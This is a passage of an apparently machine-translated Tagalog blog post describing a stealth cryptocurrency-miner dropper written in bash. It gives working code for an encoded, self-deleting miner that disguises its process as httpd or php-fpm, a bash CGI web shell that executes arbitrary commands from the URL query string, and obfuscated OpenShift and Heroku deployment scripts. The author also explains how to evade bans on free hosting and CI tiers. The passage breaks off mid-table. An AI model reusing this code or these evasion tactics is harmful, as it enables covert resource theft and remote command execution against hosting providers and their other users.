binary upang mag-apply ng mga variable, pagkatapos ay nagpunta kami buong bash<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> sa lohika na ito:<ul><li><p>basahin ang template ng config<li><p>palitan ang lahat ng mga quote ng isang napaka-esoteric string (tulad ng<code>_#_#</code>)<li><p><code>eval</code> ang template<li><p>palitan ang lahat ng mga pangyayaring esoteriko pabalik ng mga quote</ul><p>Bukod sa pag-iwas sa mga sub proseso, ang isa pang kalamangan ay nakakakuha kami ng kumpletong mga kakayahan sa pag-bash sa aming mga template. Para sa pagbabasa at pagsusulat nang walang mga template, kailangan naming umasa sa mga kakayahan sa bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Pinapayagan lamang kaming mag-edit ng mga solong linya, para sa mga multi-line na entry ay isinasaalang-alang lamang nito ang unang linya..pero sapat na ito para sa aming case ng paggamit.<h2 id=runtime><a class=header-anchor href=#runtime> Runtime</a></h2><p>Ano ang hitsura ng aming runtime? Mayroon kaming pangunahing proseso ng bash na nagpapatupad ng pangunahing loop, pagkatapos ng sub-proseso ng minero, sub-proseso ng monitor ng CPU, ang locker at ang tuner. Halos isang dakot iyon.<p>Una nais naming matiyak na kung may mali, hindi kami nag-iiwan ng gulo, nangangahulugan ito na gumagamit kami ng isang bash trap upang magsagawa ng mga paglilinis sa pagwawakas.<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> tinatanggal ang bitag upang maiwasan ang recursion. Pinapatay ng bitag ang lahat ng mga trabaho at tinatanggal ang kapaligiran sa pagtatrabaho.<p>Panahon na upang simulan ang minero, na nakaimbak bilang isang bash variable sa base64 encoding. Itinapon namin ito sa filesystem, pagkatapos ay itinatapon namin ang config, isinasagawa ang minero, at tinanggal ang parehong minero at ang config. Sa linux maaari mong alisin ang naisakatuparan ng isang tumatakbo na proseso, (sa mga bintana ay hindi ito pinapayagan).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Kapag tumatakbo ang minero, sa filesystem mayroon lamang isang<code>.. /</code> direktoryo na may a<code>b64</code> link sa loob nito<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Ang isang nakakagulat na quirk na nakatagpo ng bash habang naka-encode ang minero ay ang pagtatalaga ng isang variable na may isang subshell na may mga quote<code>myvar="$(something)"</code> sanhi ng isang permanenteng pagtaas sa paggamit ng memorya, mahirap i-debug at hindi talaga natagpuan ang dahilan kung bakit ganito ang ugali, gayon pa man ang takdang-aralin ay dapat na ma-unquote. Ang pag-decode sa halip ay tapos na sa<em> herestrings</em> na kung saan ay isang abstraction sa mga pansamantalang file, ang variable ay itinapon sa isang file na pagkatapos ay nai-tubo pabalik sa proseso.<p>Matagal nang tumatakbo ang loop ng minero:<ul><li><p>habang totoo<ul><li><p>itigil ang minero<li><p>alisin ang config<li><p>simulan ang minero<li><p>habang totoo<ul><li><p>simulan ang daemon<ul><li><p>habang tumatakbo ang minero<ul><li><p>basahin ang output mula sa minero<li><p>pumili ng aksyon ng minero batay sa linya ng output</ul></ul><li><p>kung hindi tumatakbo ang minero: masira</ul><li><p>matulog</ul></ul><p>Ang linya ng output ay naitugma laban sa ilang regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Hawak ng daemon ang mga kaso kung saan<ul><li><p>ang koneksyon sa endpoint ay nagbibigay ng mga error (pumili ng isang bagong random endpoint)<li><p>nagbabago ang algorithm ng pag-hash (ayusin ang oras ng pagtulog at mga pagsasaayos ng ad-hoc)<li><p>mga problema sa minero (i-restart ang minero).</ul><p>Para sa isang habang mayroong suporta para sa command and control dashboard, na pinapayagan na mag-trigger ng manu-manong pag-restart, subalit dahil kaunti ang paggamit nito ay itinapon ito, at ang mga endpoint nito ay pinalitan ng isang alternatibong koneksyon sa pool, pati na rin ang proseso ng pag-restart ay hindi matatag, kumplikado. ..isa pang halimbawa ng tech debt. Gayunpaman pinapayagan itong kumuha muli ng isang na-update na kargamento at muling i-set up ang lahat ng mga pagsasaayos sa mabilisang, na kung saan ay medyo cool, ang panghuli trampolin.<h2 id=debugging><a class=header-anchor href=#debugging> Pagde-debug</a></h2><p>Mayroong tatlong pangunahing mga utility<ul><li><p>paganahin / huwag paganahin ang pagsunod sa paligid ng mga bloke ng code (hindi namin nais na subaybayan ang isang naka-encode na binary na b64 sa isang variable ..)<li><p>isang simpleng pag-andar para sa pag-format ng mga tala<li><p>isang watawat na mag-aaktibo sa verbose logging sa runtime tuwing sinimulan ang minero.<ul><li><p>ang file ba<code>.debug</code> meron?<ul><li><p>paganahin ang pag-log ng verbose</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Mga target na pag-deploy</a></h2><p>Ang setup na ito ay nasubukan sa 3 uri ng mga host:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Mga lalagyan na naka-host sa sarili o VM</a></h3><p>Maraming mga tagabigay ng hosting ang hindi gusto ang pagmimina dahil ang mga mapagkukunan ng CPU ay madalas na maibahagi sa maraming mga gumagamit, at ang software ng pagmimina ay madaling makapagpabagal sa isang host node na nakakaapekto sa pagganap para sa natitirang mga gumagamit. Maaari itong totoo kahit na ang oras ng gumagamit ng CPU ay walang limitasyong, dahil ang pag-hash ng mga algorithm ay maaaring mababad ang lahat ng mga layer ng cache ng CPU kung ang cache ay ibinahagi sa lahat ng mga core ng CPU.<p>Nais naming gamitin ang aming<em> patas</em> pagbabahagi ng mga mapagkukunan nang hindi pinagbawalan, iyon ay isang mahusay na use-case para sa aming stealth dropper dahil alam nito ang paggamit ng host, na nangangahulugang ito<em> dapat</em> manatiling uri ng loob ng [AUP]. Walang labis na mga hakbang kapag nakikipag-usap sa mga naka-host na self-deployment, ang launcher script lamang, maaaring idinagdag sa pagkakasunud-sunod ng boot o manu-manong inilunsad.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> batay sa cPanel web hosting</a></h3><p>Ang mga plano sa pag-subscribe sa web hosting ay halos inaalok sa pamamagitan ng [cPanel]. Muli dito gumagamit kami ng mga personal na plano sa subscription na may makatwirang mga limitasyon sa mapagkukunan, sa kabilang banda ang anumang libreng plano ay may katawa-tawa na mga limitasyon<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . Pinapayagan ka ng cPanel na tukuyin ang mga handler para sa iba't ibang mga extension ng file, pinapayagan kaming magpatupad ng mga shell script sa pamamagitan ng<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> na may kahilingan sa http laban sa isang shell script na na-upload sa server. Ang ganitong uri ng mga interface ay ang hitsura ng mga web-shell<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Isang simpleng bash web shell<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Mas mahusay na umasa lamang sa mga builtin tulad ng forking ng karagdagang mga proseso ay maaaring hindi payagan sa mga kulungan sa web, ngunit laging posible na<code>exec</code> na nagpapahintulot sa amin na gamitin ang karamihan sa mga utility ng linya ng utos. Karamihan sa mga shell ng web ay nakasulat sa iba pang mga wika sa pag-script tulad ng sawa o php dahil hindi mo kailangang mag-alala tungkol sa forking.<p>Sa isang cpanel na kapaligiran mas mahusay na gumamit ng isang static na pangalan para sa proseso ng minero, tulad ng<code>httpd</code> o<code>php-fpm</code> kasi<code>cgi</code> ay batay sa maraming pagproseso, kaya palaging puno ang mga server ng maraming proseso na pinangalanan tulad nito, bagaman dapat mapansin ng isang maingat na tagamasid ang<em> maraming sinulid</em> pattern ng paggamit na tiyak na hindi karaniwan (o posible) para sa mga wika tulad ng perl, php, ruby, o sawa!<p>Ang mga proseso ay mayroon ding isang limitasyon sa oras bilang default, (1 oras, 1 araw, atbp.), Para dito ginagamit lamang namin ang isang cron job na nag-restart ng dropper.<p>Nangangailangan ito ng maraming manu-manong pag-edit, ang cpanel api upang i-automate ito ay sa kasamaang palad ay hindi nakalantad sa mga end na gumagamit, kaya ang web hosting ay isang clunky at boring na target para sa aming dropper ng minero.<h3 id=web_environments><a class=header-anchor href=#web_environments> Mga kapaligiran sa web</a></h3><p>Meron<em> SaaS</em> mga provider na mayroong isang web editor na isinama sa isang lalagyan, tulad ng<a href="with a free tier before getting acquired by amazon"> ulap9</a> , [codeanywhere], [codenvy]. Madali ang pag-deploy ng dropper dito (mayroon kang isang buong kapaligiran), ngunit ang pagpapanatiling tumatakbo ito ay isang pasanin, dahil ang anumang interactive na web editor ay tinatapos ang sesyon nito kaagad pagkatapos na sarado ang web page, at ang lalagyan ay pinatutulog (maliban kung ikaw magbayad syempre).<p>Ang pag-Circumventing ay nangangahulugan lamang na panatilihing bukas ang mga sesyon, nakamit ng ilang pag-script kasama ang [puppeteer] ang nais na resulta, ngunit ang pagkakaroon ng mahabang pagpapatakbo, paglabas ng memorya, namamaga ng mga web page ng SPA ay tiyak na hindi nakakaakit at hindi stealthy, dahil mula sa backend ng provider, isang session na binuksan 24/7 ay tiyak na magmukhang kahina-hinala. Sa katunayan, ang mga kapaligiran sa web ay clunky at mainip din na mga target.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Mga serbisyong libreng app</a></h3><p>Ito ay higit sa lahat<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> at [heroku]. Ang Openshift, pagiging kubernetes ay medyo prangka upang maipadala, ngunit puno ng pagsasaayos ng churn, narito ang isang sipi:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(<span class=hljs-built_in>cat</span> vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(<span class=hljs-built_in>cat</span><span class=hljs-variable>$launcher</span> | <span class=hljs-built_in>tail</span> +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
<span class=hljs-built_in>chmod</span> +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Ito ang ginamit na script upang maitayo ang lalagyan ng pagmimina na nangangailangan ng isang template ng yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Ngunit ang buong proseso ay kasangkot ng maraming mga hakbang!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span><span class=hljs-built_in>mv</span><span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(<span class=hljs-built_in>date</span> +%s)}</code></pre><p>Sa pseudo code:<ul><li><p>lumikha ng proyekto<li><p>lumikha ng application nang walang isang imahe<li><p>itayo ang lalagyan ng pagmimina<li><p>i-deploy ang lalagyan gamit ang isang config ng pag-deploy (kubernetes abstraction)<li><p>ilunsad ang pag-deploy</ul><p>Ang<code>build-build</code> ang mga script sa halip ay lumikha ng a<em> magtayo</em> lalagyan na magmimina ng ilang oras nang paisa-isa. Ang mga build at normal pod ay may magkakahiwalay na mapagkukunan sa openshift kaya't sinamantala namin ang pareho sa kanila. Ang Openshift ay pangkalahatang isang masamang karanasan dahil lumipas ito sa 4 na magkakaibang mga paglabas (marahil higit pa, tumigil ako sa pagsubaybay makalipas ang ilang sandali) at bawat isa sa kanila ay nangangailangan ng mga pagbabago sa mga pagsasaayos, wala silang mga landas sa pag-upgrade at lahat ay mabilis na naulit, at karaniwan para sa mga build / pod upang tumigil, at hindi pagkolekta ng basura ... kadalasan ay tumatakbo silang manu-manong i-restart bawat minsan, marahil ang kubernetes ay maraming surot lamang :)<p>Ang pagsasaayos ng Heroku ay medyo simple (hindi ito kasangkot sa kubernetes). Bukod sa pagbuo ng lalagyan, na kung saan ay katulad ng isa sa buksan ng sandali, ang natitira ay dalawang mga utos lamang na kliyente<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>Ang lalagyan ay direktang itinulak gamit ang docker sa heroku registry.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> Ang pagkikiskisan sa heroku (kung aling libreng baitang ay nakatayo pa rin sa oras ng pagsulat) ay ang mga dynos ay maaari lamang tumakbo sa loob ng 22 araw bawat buwan kaya't kailangan nila ng ilang pamamahala nang manu-mano bawat buwan, muli clunky at mainip. Nagpagawa sila ng ilang mga ban alon sa simula, at pagkatapos ay hindi pinagana ang mga pagarehistro sa pamamagitan ng TOR, sigurado akong ako ang sanhi nito.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Mga lalagyan ng CI o VM</a></h3><p>Ito ang pinaka synergic na target para sa aming dropper. Maraming<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> mga kumpanya, marami sa mga ito ay nasusunog ng pera sa mga namumuhunan na nag-aalok ng mga libreng antas sa pag-asa na mangolekta ng ilang bahagi sa merkado sa negosyong pang-imprastraktura ng tech.<p>Ang lahat ng mga serbisyong ito ay nag-aalok ng iba't ibang mga mapagkukunan, may iba't ibang mga kinakailangan sa pagsasaayos at tumatakbo sa iba't ibang mga kapaligiran. Hindi ko na isinasaalang-alang ang pag-automate ng pagpaparehistro ng account dahil ang mga uri ng mga bagay na iyon ay kakila-kilabot sa programa, sinisikap kong iwasan ang mga ito sa lahat ng oras, kaya't tiniis ko lang ang mga manu-manong pagrerehistro habang nagtataka ako sa kung anong uri ng pagtugon sa anti spam ang makukuha ko (at gaano kaiba sa iba pa!). Maaari mong hulaan ang ilang mga bagay tungkol sa pamamahala ng isang kumpanya mula sa kung paano ito hawakan ng spam:<ul><li><p>Gumagawa ba ito ng mga ban alon? Pagkatapos mayroon silang mga hindi mahigpit na patakaran, ang mga problema ay manu-manong hinahawakan at bawat kaso<li><p>Nangangailangan ba ito ng pag-verify sa telepono? Inabuso na sila dati<li><p>Tumutugon ba sila sa mabibigat na paggamit ng mapagkukunan? Tumatakbo ang mga ito sa isang masikip na badyet<li><p>Naglalapat ba sila ng mga paghihigpit sa account o pagbabawal ng anino? Kung sila ay nagbabawal ng anino, mayroon silang ibig sabihin na sysadmins.</ul><p>Mayroon ding isang pilosopong tanong: Kung pinapayagan ka ng isang serbisyo na abusuhin ang kanilang system sa mahabang panahon, nangangahulugan ba ito na mayroon silang isang pinakamataas na imprastraktura na may kakayahang hawakan ang karga, o simpleng hindi magagawang kontrol sa kanilang system? At dapat mong isaalang-alang ang balanse sa pagitan ng kakayahang mai-access at seguridad, ang isang system na masyadong ligtas ay maaaring magpababa ng pagpapanatili ng gumagamit.<p>Narito ang isang talahanayan na nagpapakita ng ilang mga serbisyo na ipinakalat ko sa:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>pagsasaayos<th style=text-align:center>pagganap<th style=text-align:center>ban-martilyo<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>masama<td style=color:#ff0;text-align:center>daluyan<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>mabuti<td style=color:#ff0;text-align:center>daluyan<td style=color:green;text-align:center>mabuti<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>daluyan<td style=color:red;text-align:center>masama<td style=color:#ff0;text-align:center>daluyan<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>daluyan<td style=color:green;text-align:center>mabuti<td style=color:green;text-align:center>mabuti<tr><td 